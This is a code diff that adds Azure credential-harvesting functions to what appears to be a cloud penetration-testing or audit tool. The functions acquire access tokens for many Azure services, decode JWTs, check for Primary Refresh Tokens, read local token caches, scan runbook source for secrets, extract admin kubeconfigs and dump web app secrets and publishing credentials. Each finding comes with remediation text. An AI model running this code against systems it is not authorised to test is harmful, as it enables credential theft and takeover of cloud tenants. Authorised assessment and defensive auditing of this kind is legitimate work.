@@ -791,3 +791,480 @@ export async function automationCredDump(args: string[], timeout: number): Promi
 
   return { output: output.join("\n"), findings }
 }
+
+export async function graphTokenHarvest(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Harvesting Microsoft Graph and Azure resource tokens...\n"]
+
+  const resources = [
+    { name: "Microsoft Graph", url: "https://graph.microsoft.com" },
+    { name: "Azure Management", url: "https://management.azure.com" },
+    { name: "Azure Key Vault", url: "https://vault.azure.net" },
+    { name: "Azure SQL Database", url: "https://database.windows.net" },
+    { name: "Azure Storage", url: "https://storage.azure.com" },
+    { name: "Azure Data Lake", url: "https://datalake.azure.net" },
+    { name: "Azure Service Bus", url: "https://servicebus.azure.net" },
+    { name: "Azure Event Hubs", url: "https://eventhubs.azure.net" },
+    { name: "Azure Log Analytics", url: "https://api.loganalytics.io" },
+    { name: "Azure DevOps", url: "499b84ac-1321-427f-aa17-267ca6975798" },
+  ]
+
+  for (const r of resources) {
+    const tok = await run("az", ["account", "get-access-token", "--resource", r.url, "-o", "json"], timeout)
+    if (tok.exitCode === 0) {
+      const data = tryJson(tok.stdout)
+      if (data?.accessToken) {
+        const parts = data.accessToken.split(".")
+        let claims: Record<string, string> = {}
+        try {
+          claims = JSON.parse(Buffer.from(parts[1], "base64").toString())
+        } catch {}
+        const exp = claims.exp ? new Date(Number(claims.exp) * 1000).toISOString() : "unknown"
+        const aud = claims.aud || r.url
+        const appid = claims.appid || "N/A"
+        output.push(`[+] ${r.name}: TOKEN ACQUIRED`)
+        output.push(`    Audience: ${aud}`)
+        output.push(`    AppId: ${appid}`)
+        output.push(`    Expires: ${exp}`)
+        output.push(`    Token (first 40): ${data.accessToken.substring(0, 40)}...`)
+        output.push("")
+        findings.push({
+          checkId: "AZ-GRAPH-001",
+          provider: "azure",
+          severity: "high",
+          status: "HARVESTED",
+          resource: `token://${r.name}`,
+          title: `Token acquired for ${r.name}`,
+          details: `Audience: ${aud}, AppId: ${appid}, Expires: ${exp}`,
+          remediation: "Revoke sessions and rotate credentials",
+        })
+      }
+    } else {
+      output.push(`[-] ${r.name}: access denied or no token available`)
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function refreshTokenReplay(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Extracting and analyzing refresh/access tokens...\n"]
+
+  const tok = await run("az", ["account", "get-access-token", "-o", "json"], timeout)
+  if (tok.exitCode === 0) {
+    const data = tryJson(tok.stdout)
+    if (data?.accessToken) {
+      const parts = data.accessToken.split(".")
+      if (parts.length === 3) {
+        let header: Record<string, string> = {}
+        let payload: Record<string, string> = {}
+        try {
+          header = JSON.parse(Buffer.from(parts[0], "base64").toString())
+          payload = JSON.parse(Buffer.from(parts[1], "base64").toString())
+        } catch {}
+        output.push("[+] Access Token JWT Decoded:")
+        output.push(`    Algorithm: ${header.alg || "N/A"}`)
+        output.push(`    Type: ${header.typ || "N/A"}`)
+        output.push(`    Issuer: ${payload.iss || "N/A"}`)
+        output.push(`    Audience: ${payload.aud || "N/A"}`)
+        output.push(`    Subject: ${payload.sub || "N/A"}`)
+        output.push(`    UPN: ${payload.upn || "N/A"}`)
+        output.push(`    AppId: ${payload.appid || payload.azp || "N/A"}`)
+        output.push(`    Tenant: ${payload.tid || "N/A"}`)
+        output.push(`    Scopes: ${payload.scp || "N/A"}`)
+        output.push(`    Roles: ${Array.isArray(payload.roles) ? payload.roles.join(", ") : payload.roles || "N/A"}`)
+        output.push(`    Issued: ${payload.iat ? new Date(Number(payload.iat) * 1000).toISOString() : "N/A"}`)
+        output.push(`    Expires: ${payload.exp ? new Date(Number(payload.exp) * 1000).toISOString() : "N/A"}`)
+        const amr = payload.amr
+        if (amr) output.push(`    Auth methods: ${Array.isArray(amr) ? amr.join(", ") : amr}`)
+        const deviceid = payload.deviceid
+        if (deviceid) output.push(`    Device ID: ${deviceid} (PRT-linked)`)
+        output.push("")
+        findings.push({
+          checkId: "AZ-PRT-001",
+          provider: "azure",
+          severity: "high",
+          status: "EXTRACTED",
+          resource: `token://access/${payload.upn || payload.sub || "unknown"}`,
+          title: `Access token decoded for ${payload.upn || payload.sub || "unknown"}`,
+          details: `Tenant: ${payload.tid}, AppId: ${payload.appid || payload.azp}, Scopes: ${payload.scp || "N/A"}`,
+          remediation: "Revoke all refresh tokens: az rest --method POST --url 'https://graph.microsoft.com/v1.0/me/revokeSignInSessions'",
+        })
+      }
+    }
+  } else {
+    output.push("[-] Could not acquire access token via az CLI")
+  }
+
+  if (process.platform === "win32") {
+    output.push("\n[*] Checking dsregcmd for PRT info...")
+    const dsreg = await run("dsregcmd", ["/status"], timeout)
+    if (dsreg.exitCode === 0) {
+      const lines = dsreg.stdout.split("\n")
+      const prtLine = lines.find((l: string) => l.includes("AzureAdPrt"))
+      if (prtLine && prtLine.includes("YES")) {
+        output.push("[+] PRT is present on this device!")
+        const tenantLine = lines.find((l: string) => l.includes("TenantId"))
+        if (tenantLine) output.push(`    ${tenantLine.trim()}`)
+        findings.push({
+          checkId: "AZ-PRT-002",
+          provider: "azure",
+          severity: "critical",
+          status: "DETECTED",
+          resource: "device://prt",
+          title: "Primary Refresh Token (PRT) present on device",
+          details: "PRT can be extracted for session hijacking — use tools like ROADtoken or RequestAADRefreshToken",
+          remediation: "Wipe device registration or revoke sessions",
+        })
+      } else {
+        output.push("[-] No PRT detected on this device")
+      }
+    }
+  } else {
+    output.push("\n[*] PRT extraction via dsregcmd only available on Windows — skipping")
+  }
+
+  const cacheFiles = [
+    `${process.env.HOME || process.env.USERPROFILE}/.azure/azureProfile.json`,
+    `${process.env.HOME || process.env.USERPROFILE}/.azure/msal_token_cache.json`,
+    `${process.env.HOME || process.env.USERPROFILE}/.azure/msal_token_cache.bin`,
+    `${process.env.HOME || process.env.USERPROFILE}/.azure/service_principal_entries.json`,
+  ]
+  output.push("\n[*] Checking local token caches...")
+  for (const p of cacheFiles) {
+    try {
+      const f = Bun.file(p)
+      if (await f.exists()) {
+        const size = f.size
+        output.push(`[+] Found: ${p} (${size} bytes)`)
+        if (p.endsWith(".json") && size < 1_000_000) {
+          const content = await f.text()
+          const parsed = tryJson(content)
+          if (parsed) {
+            const keys = Object.keys(parsed)
+            output.push(`    Keys: ${keys.slice(0, 10).join(", ")}${keys.length > 10 ? ` (+${keys.length - 10} more)` : ""}`)
+          }
+        }
+        findings.push({
+          checkId: "AZ-PRT-003",
+          provider: "azure",
+          severity: "medium",
+          status: "FOUND",
+          resource: `file://${p}`,
+          title: `Token cache file found: ${p.split("/").pop()}`,
+          details: `${size} bytes — may contain refresh tokens or cached credentials`,
+          remediation: "Clear token cache: az account clear",
+        })
+      }
+    } catch {}
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function runbookCredExtract(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const targetAccount = argVal(args, "--automation-account")
+  const targetRg = argVal(args, "--resource-group")
+  const targetRunbook = argVal(args, "--runbook")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Extracting runbook source code and scanning for credentials...\n"]
+
+  const credPatterns = [
+    { name: "Password", regex: /(?:password|passwd|pwd)\s*[=:]\s*["']([^"']{4,})["']/gi },
+    { name: "Connection String", regex: /(?:connectionstring|connstr|connection_string)\s*[=:]\s*["']([^"']{10,})["']/gi },
+    { name: "API Key", regex: /(?:apikey|api_key|api-key|x-api-key)\s*[=:]\s*["']([^"']{10,})["']/gi },
+    { name: "Secret", regex: /(?:secret|client_secret|clientsecret)\s*[=:]\s*["']([^"']{4,})["']/gi },
+    { name: "SAS Token", regex: /(?:sv=\d{4}-\d{2}-\d{2}&[^"'\s]{20,})/gi },
+    { name: "Access Key", regex: /(?:AccountKey|accesskey|access_key)\s*[=:]\s*["']?([A-Za-z0-9+/=]{40,})["']?/gi },
+  ]
+
+  let accounts: Array<{ name: string; rg: string }> = []
+  if (targetAccount && targetRg) {
+    accounts = [{ name: targetAccount, rg: targetRg }]
+  } else {
+    const list = await az(["automation", "account", "list", "--query", "[].{name:name,rg:resourceGroup}"], sub, timeout)
+    if (list.exitCode === 0) accounts = tryJson(list.stdout) || []
+  }
+
+  if (accounts.length === 0) {
+    output.push("[-] No automation accounts found")
+    return { output: output.join("\n"), findings }
+  }
+
+  for (const acct of accounts) {
+    output.push(`\n[*] Account: ${acct.name} (RG: ${acct.rg})`)
+    const rbList = await az(
+      ["automation", "runbook", "list", "--automation-account-name", acct.name, "--resource-group", acct.rg, "--query", "[].{name:name,type:runbookType,state:state}"],
+      sub,
+      timeout,
+    )
+    if (rbList.exitCode !== 0) {
+      output.push("  [-] Cannot list runbooks")
+      continue
+    }
+    const runbooks = (tryJson(rbList.stdout) || []) as Array<{ name: string; type: string; state: string }>
+    const targets = targetRunbook ? runbooks.filter((r) => r.name === targetRunbook) : runbooks
+
+    for (const rb of targets) {
+      output.push(`\n  [*] Runbook: ${rb.name} (${rb.type}, ${rb.state})`)
+      const exportCmd = await run(
+        "az",
+        ["automation", "runbook", "export", "--automation-account-name", acct.name, "--resource-group", acct.rg, "--name", rb.name, "-o", "tsv", ...(sub ? ["--subscription", sub] : [])],
+        timeout,
+      )
+
+      if (exportCmd.exitCode !== 0 || !exportCmd.stdout.trim()) {
+        output.push(`    [-] Cannot export source (exit=${exportCmd.exitCode})`)
+        continue
+      }
+
+      const source = exportCmd.stdout
+      output.push(`    [+] Source extracted: ${source.length} chars`)
+
+      let credsFound = 0
+      for (const pat of credPatterns) {
+        pat.regex.lastIndex = 0
+        let match
+        while ((match = pat.regex.exec(source)) !== null) {
+          credsFound++
+          const lineNum = source.substring(0, match.index).split("\n").length
+          const snippet = match[0].substring(0, 80)
+          output.push(`    [!] ${pat.name} found at line ${lineNum}: ${snippet}...`)
+          findings.push({
+            checkId: "AZ-RUNBOOK-001",
+            provider: "azure",
+            severity: "critical",
+            status: "FOUND",
+            resource: `runbook://${acct.name}/${rb.name}:${lineNum}`,
+            title: `${pat.name} in runbook ${rb.name}`,
+            details: `Found at line ${lineNum}: ${snippet.substring(0, 60)}...`,
+            remediation: "Move credentials to Key Vault or Automation Account credentials, remove from source",
+          })
+        }
+      }
+      if (credsFound === 0) output.push("    [-] No hardcoded credentials detected")
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function kubeconfigDump(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const targetCluster = argVal(args, "--cluster")
+  const targetRg = argVal(args, "--resource-group")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Enumerating AKS clusters and extracting kubeconfig...\n"]
+
+  const list = await az(["aks", "list", "--query", "[].{name:name,rg:resourceGroup,rbac:enableRbac,aad:aadProfile,mi:identity.type,network:networkProfile.networkPlugin,fqdn:fqdn,publicAccess:apiServerAccessProfile.enablePrivateCluster}"], sub, timeout)
+  if (list.exitCode !== 0) {
+    output.push("[-] Cannot list AKS clusters")
+    return { output: output.join("\n"), findings }
+  }
+
+  const clusters = (tryJson(list.stdout) || []) as Array<Record<string, unknown>>
+  output.push(`[+] Found ${clusters.length} AKS cluster(s)\n`)
+
+  for (const c of clusters) {
+    const name = c.name as string
+    const rg = c.rg as string
+    if (targetCluster && name !== targetCluster) continue
+    if (targetRg && rg !== targetRg) continue
+
+    output.push(`[*] Cluster: ${name} (RG: ${rg})`)
+    output.push(`    RBAC: ${c.rbac ? "enabled" : "DISABLED"}`)
+    output.push(`    AAD Integration: ${c.aad ? "enabled" : "not configured"}`)
+    output.push(`    Identity: ${c.mi || "N/A"}`)
+    output.push(`    Network Plugin: ${c.network || "N/A"}`)
+    output.push(`    FQDN: ${c.fqdn || "N/A"}`)
+    output.push(`    Private Cluster: ${c.publicAccess === true ? "yes" : "no (public API)"}`)
+
+    if (!c.rbac) {
+      findings.push({
+        checkId: "AZ-KUBE-001",
+        provider: "azure",
+        severity: "critical",
+        status: "FAIL",
+        resource: `aks://${rg}/${name}`,
+        title: `AKS cluster ${name} has RBAC disabled`,
+        details: "Without RBAC, any authenticated user has full cluster access",
+        remediation: "Enable RBAC: az aks update --enable-aad --enable-azure-rbac",
+      })
+    }
+
+    if (c.publicAccess !== true) {
+      findings.push({
+        checkId: "AZ-KUBE-002",
+        provider: "azure",
+        severity: "high",
+        status: "FAIL",
+        resource: `aks://${rg}/${name}`,
+        title: `AKS cluster ${name} has public API endpoint`,
+        details: `API server is publicly accessible at ${c.fqdn}`,
+        remediation: "Enable private cluster: az aks update --enable-private-cluster",
+      })
+    }
+
+    const adminCreds = await run("az", ["aks", "get-credentials", "--resource-group", rg, "--name", name, "--admin", "--file", "-", ...(sub ? ["--subscription", sub] : [])], timeout)
+    if (adminCreds.exitCode === 0 && adminCreds.stdout.trim()) {
+      output.push(`    [+] ADMIN kubeconfig extracted (${adminCreds.stdout.length} bytes)`)
+      const kubecfg = adminCreds.stdout
+      if (kubecfg.includes("client-certificate-data")) output.push("    [+] Contains client certificate data")
+      if (kubecfg.includes("client-key-data")) output.push("    [+] Contains client key data")
+      if (kubecfg.includes("token")) output.push("    [+] Contains access token")
+      findings.push({
+        checkId: "AZ-KUBE-003",
+        provider: "azure",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: `aks://${rg}/${name}/admin-kubeconfig`,
+        title: `Admin kubeconfig extracted for AKS cluster ${name}`,
+        details: "Admin credentials provide full cluster access — no RBAC restrictions",
+        remediation: "Disable local accounts: az aks update --disable-local-accounts",
+      })
+    } else {
+      output.push("    [-] Admin kubeconfig not available (local accounts may be disabled)")
+      const userCreds = await run("az", ["aks", "get-credentials", "--resource-group", rg, "--name", name, "--file", "-", ...(sub ? ["--subscription", sub] : [])], timeout)
+      if (userCreds.exitCode === 0 && userCreds.stdout.trim()) {
+        output.push(`    [+] User kubeconfig extracted (${userCreds.stdout.length} bytes)`)
+        findings.push({
+          checkId: "AZ-KUBE-004",
+          provider: "azure",
+          severity: "high",
+          status: "EXTRACTED",
+          resource: `aks://${rg}/${name}/user-kubeconfig`,
+          title: `User kubeconfig extracted for AKS cluster ${name}`,
+          details: "User credentials extracted — access level depends on RBAC bindings",
+          remediation: "Review cluster RBAC bindings and restrict access",
+        })
+      } else {
+        output.push("    [-] Cannot extract user kubeconfig either")
+      }
+    }
+    output.push("")
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function webappEnvDump(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const targetApp = argVal(args, "--app")
+  const targetRg = argVal(args, "--resource-group")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Extracting App Service environment variables and connection strings...\n"]
+
+  const secretPatterns = [
+    /password/i, /secret/i, /key(?!vault)/i, /token/i, /connection.?string/i,
+    /api.?key/i, /access.?key/i, /sas/i, /credential/i, /auth/i, /private/i,
+  ]
+
+  let apps: Array<{ name: string; rg: string }> = []
+  if (targetApp && targetRg) {
+    apps = [{ name: targetApp, rg: targetRg }]
+  } else {
+    const list = await az(["webapp", "list", "--query", "[].{name:name,rg:resourceGroup}"], sub, timeout)
+    if (list.exitCode === 0) apps = tryJson(list.stdout) || []
+    const funcList = await az(["functionapp", "list", "--query", "[].{name:name,rg:resourceGroup}"], sub, timeout)
+    if (funcList.exitCode === 0) apps = [...apps, ...(tryJson(funcList.stdout) || [])]
+  }
+
+  if (apps.length === 0) {
+    output.push("[-] No App Services or Function Apps found")
+    return { output: output.join("\n"), findings }
+  }
+
+  output.push(`[+] Found ${apps.length} app(s)\n`)
+
+  for (const app of apps) {
+    output.push(`[*] App: ${app.name} (RG: ${app.rg})`)
+
+    const settings = await az(
+      ["webapp", "config", "appsettings", "list", "--name", app.name, "--resource-group", app.rg],
+      sub,
+      timeout,
+    )
+    if (settings.exitCode === 0) {
+      const settingsList = (tryJson(settings.stdout) || []) as Array<{ name: string; value: string; slotSetting: boolean }>
+      output.push(`    [+] App Settings: ${settingsList.length}`)
+      for (const s of settingsList) {
+        const isSensitive = secretPatterns.some((p) => p.test(s.name))
+        if (isSensitive) {
+          const masked = s.value ? `${s.value.substring(0, 6)}...${s.value.substring(s.value.length - 4)}` : "(empty)"
+          output.push(`    [!] SENSITIVE: ${s.name} = ${masked}`)
+          findings.push({
+            checkId: "AZ-WEBAPP-001",
+            provider: "azure",
+            severity: "high",
+            status: "FOUND",
+            resource: `webapp://${app.name}/setting/${s.name}`,
+            title: `Sensitive app setting: ${s.name} in ${app.name}`,
+            details: `Value (masked): ${masked}`,
+            remediation: "Move to Key Vault reference: @Microsoft.KeyVault(SecretUri=...)",
+          })
+        } else {
+          output.push(`        ${s.name} = ${(s.value || "").substring(0, 60)}${(s.value || "").length > 60 ? "..." : ""}`)
+        }
+      }
+    }
+
+    const connStrings = await az(
+      ["webapp", "config", "connection-string", "list", "--name", app.name, "--resource-group", app.rg],
+      sub,
+      timeout,
+    )
+    if (connStrings.exitCode === 0) {
+      const connData = tryJson(connStrings.stdout)
+      if (connData && typeof connData === "object") {
+        const entries = Object.entries(connData) as Array<[string, { type: string; value: string }]>
+        output.push(`    [+] Connection Strings: ${entries.length}`)
+        for (const [connName, info] of entries) {
+          if (info.value) {
+            const masked = `${info.value.substring(0, 15)}...`
+            output.push(`    [!] ${connName} (${info.type}): ${masked}`)
+            findings.push({
+              checkId: "AZ-WEBAPP-002",
+              provider: "azure",
+              severity: "critical",
+              status: "FOUND",
+              resource: `webapp://${app.name}/connstring/${connName}`,
+              title: `Connection string in ${app.name}: ${connName}`,
+              details: `Type: ${info.type}, Value (masked): ${masked}`,
+              remediation: "Use Key Vault references for connection strings",
+            })
+          }
+        }
+      }
+    }
+
+    const publishProfile = await az(
+      ["webapp", "deployment", "list-publishing-profiles", "--name", app.name, "--resource-group", app.rg],
+      sub,
+      timeout,
+    )
+    if (publishProfile.exitCode === 0) {
+      const profileList = (tryJson(publishProfile.stdout) || []) as Array<{ publishMethod: string; userName: string; userPWD: string; publishUrl: string }>
+      if (profileList.length > 0) {
+        output.push(`    [+] Publishing Profiles: ${profileList.length}`)
+        for (const p of profileList) {
+          output.push(`        ${p.publishMethod}: ${p.userName} @ ${p.publishUrl}`)
+          findings.push({
+            checkId: "AZ-WEBAPP-003",
+            provider: "azure",
+            severity: "high",
+            status: "FOUND",
+            resource: `webapp://${app.name}/publish/${p.publishMethod}`,
+            title: `Publishing credentials for ${app.name} (${p.publishMethod})`,
+            details: `User: ${p.userName}, URL: ${p.publishUrl}`,
+            remediation: "Reset publishing credentials and use deployment slots",
+          })
+        }
+      }
+    }
+    output.push("")
+  }
+
+  return { output: output.join("\n"), findings }
+}
